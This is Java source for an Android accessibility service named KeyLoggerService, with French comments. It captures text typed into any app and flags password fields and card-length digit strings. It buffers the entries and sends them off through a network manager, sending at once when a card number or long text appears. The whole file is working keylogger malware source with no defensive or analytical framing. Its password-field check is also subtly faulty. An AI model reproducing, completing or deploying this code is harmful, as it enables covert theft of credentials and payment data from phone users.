// KeyLoggerService.java
package com.ghost.core;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

public class KeyLoggerService extends AccessibilityService {
    
    private static KeyLoggerService instance;
    private List<String> keyLogs = new ArrayList<>();
    private NetworkManager networkManager;
    
    public static KeyLoggerService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        networkManager = new NetworkManager(this);
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && !TextUtils.isEmpty(source.getText())) {
                String text = source.getText().toString();
                String packageName = event.getPackageName() != null ? 
                    event.getPackageName().toString() : "unknown";
                
                // Détecter les informations sensibles
                boolean isPassword = isPasswordField(source);
                boolean isCreditCard = isCreditCardNumber(text);
                
                KeyLogEntry entry = new KeyLogEntry(
                    packageName,
                    text,
                    System.currentTimeMillis(),
                    isPassword,
                    isCreditCard
                );
                
                keyLogs.add(entry.toString());
                
                // Envoyer immédiatement si c'est important
                if (isCreditCard || text.length() > 20) {
                    sendLogs();
                }
                
                // Limiter la taille des logs
                if (keyLogs.size() > 1000) {
                    keyLogs.remove(0);
                }
            }
        }
    }
    
    private boolean isPasswordField(AccessibilityNodeInfo node) {
        if (node == null) return false;
        
        int inputType = node.getInputType();
        return (inputType & 0x00000001) != 0; // TYPE_TEXT_VARIATION_PASSWORD
    }
    
    private boolean isCreditCardNumber(String text) {
        // Détection basique de numéros de carte
        String clean = text.replaceAll("[^0-9]", "");
        return clean.length() >= 13 && clean.length() <= 19;
    }
    
    public void sendLogs() {
        if (!keyLogs.isEmpty()) {
            StringBuilder logs = new StringBuilder();
            for (String log : keyLogs) {
                logs.append(log).append("\n");
            }
            
            networkManager.sendData("keylogs", logs.toString());
            keyLogs.clear();
        }
    }
    
    @Override
    public void onInterrupt() {
        // Rien
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
    }
    
    class KeyLogEntry {
        String packageName;
        String text;
        long timestamp;
        boolean isPassword;
        boolean isCreditCard;
        
        KeyLogEntry(String pkg, String txt, long time, boolean pass, boolean cc) {
            packageName = pkg;
            text = txt;
            timestamp = time;
            isPassword = pass;
            isCreditCard = cc;
        }
        
        public String toString() {
            return String.format("%d|%s|%s|%b|%b", 
                timestamp, packageName, text, isPassword, isCreditCard);
        }
    }
}
